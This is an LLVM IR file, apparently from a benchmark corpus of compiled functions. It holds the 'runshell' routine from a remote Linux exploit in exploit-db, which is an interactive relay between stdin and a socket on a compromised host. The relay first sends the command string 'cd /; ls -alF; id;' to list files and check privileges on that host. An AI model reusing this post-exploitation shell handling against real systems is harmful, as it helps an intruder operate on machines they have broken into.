; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20077.c_runshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20077.c_runshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdin = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"cd /; ls -alF; id;\0A\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"select()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"recv()\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [19 x i8] c"Connection closed\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [7 x i8] c"send()\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"Transmission loss\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @runshell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca [1024 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %7 = load i32, i32* @stdin, align 4
  %8 = call i32 @fileno(i32 %7)
  %9 = load i32, i32* %2, align 4
  %10 = call i32 @max(i32 %8, i32 %9)
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %2, align 4
  %13 = call i32 @send(i32 %12, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i32 19, i32 0)
  br label %14

14:                                               ; preds = %87, %1
  %15 = call i32 @FD_ZERO(i32* %6)
  %16 = load i32, i32* @stdin, align 4
  %17 = call i32 @fileno(i32 %16)
  %18 = call i32 @FD_SET(i32 %17, i32* %6)
  %19 = load i32, i32* %2, align 4
  %20 = call i32 @FD_SET(i32 %19, i32* %6)
  %21 = load i32, i32* %4, align 4
  %22 = call i64 @select(i32 %21, i32* %6, i32* null, i32* null, i32* null)
  %23 = icmp slt i64 %22, 0
  br i1 %23, label %24, label %28

24:                                               ; preds = %14
  %25 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %26 = load i32, i32* @EXIT_FAILURE, align 4
  %27 = call i32 @exit(i32 %26) #3
  unreachable

28:                                               ; preds = %14
  %29 = load i32, i32* %2, align 4
  %30 = call i64 @FD_ISSET(i32 %29, i32* %6)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %57

32:                                               ; preds = %28
  %33 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %34 = call i32 @bzero(i8* %33, i32 1024)
  %35 = load i32, i32* %2, align 4
  %36 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %37 = call i32 @recv(i32 %35, i8* %36, i32 1024, i32 0)
  store i32 %37, i32* %5, align 4
  %38 = icmp slt i32 %37, 0
  br i1 %38, label %39, label %43

39:                                               ; preds = %32
  %40 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %41 = load i32, i32* @EXIT_FAILURE, align 4
  %42 = call i32 @exit(i32 %41) #3
  unreachable

43:                                               ; preds = %32
  %44 = load i32, i32* %5, align 4
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %51, label %46

46:                                               ; preds = %43
  %47 = load i32, i32* @stderr, align 4
  %48 = call i32 @fprintf(i32 %47, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0))
  %49 = load i32, i32* @EXIT_FAILURE, align 4
  %50 = call i32 @exit(i32 %49) #3
  unreachable

51:                                               ; preds = %43
  %52 = load i32, i32* @stdout, align 4
  %53 = call i32 @fileno(i32 %52)
  %54 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %55 = load i32, i32* %5, align 4
  %56 = call i32 @write(i32 %53, i8* %54, i32 %55)
  br label %57

57:                                               ; preds = %51, %28
  %58 = load i32, i32* @stdin, align 4
  %59 = call i32 @fileno(i32 %58)
  %60 = call i64 @FD_ISSET(i32 %59, i32* %6)
  %61 = icmp ne i64 %60, 0
  br i1 %61, label %62, label %87

62:                                               ; preds = %57
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %64 = call i32 @bzero(i8* %63, i32 1024)
  %65 = load i32, i32* @stdin, align 4
  %66 = call i32 @fileno(i32 %65)
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %68 = call i32 @read(i32 %66, i8* %67, i32 1024)
  store i32 %68, i32* %5, align 4
  store i64 0, i64* @errno, align 8
  %69 = load i32, i32* %2, align 4
  %70 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %71 = load i32, i32* %5, align 4
  %72 = call i32 @send(i32 %69, i8* %70, i32 %71, i32 0)
  %73 = load i32, i32* %5, align 4
  %74 = icmp ne i32 %72, %73
  br i1 %74, label %75, label %86

75:                                               ; preds = %62
  %76 = load i64, i64* @errno, align 8
  %77 = icmp ne i64 %76, 0
  br i1 %77, label %78, label %80

78:                                               ; preds = %75
  %79 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %83

80:                                               ; preds = %75
  %81 = load i32, i32* @stderr, align 4
  %82 = call i32 @fprintf(i32 %81, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  br label %83

83:                                               ; preds = %80, %78
  %84 = load i32, i32* @EXIT_FAILURE, align 4
  %85 = call i32 @exit(i32 %84) #3
  unreachable

86:                                               ; preds = %62
  br label %87

87:                                               ; preds = %86, %57
  br label %14
}

declare dso_local i32 @max(i32, i32) #1

declare dso_local i32 @fileno(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
